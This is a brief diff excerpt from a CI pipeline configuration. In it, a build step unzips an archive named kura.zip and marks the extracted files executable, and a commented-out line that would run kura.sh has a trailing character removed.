@@ -11,7 +11,7 @@ working_dir: &working_dir ~/app
         command: |
           sleep 10s          
           unzip kura.zip && chmod u+x *
-          #./kura.sh#
+          #./kura.sh
     - run:
         name: C
         command: |
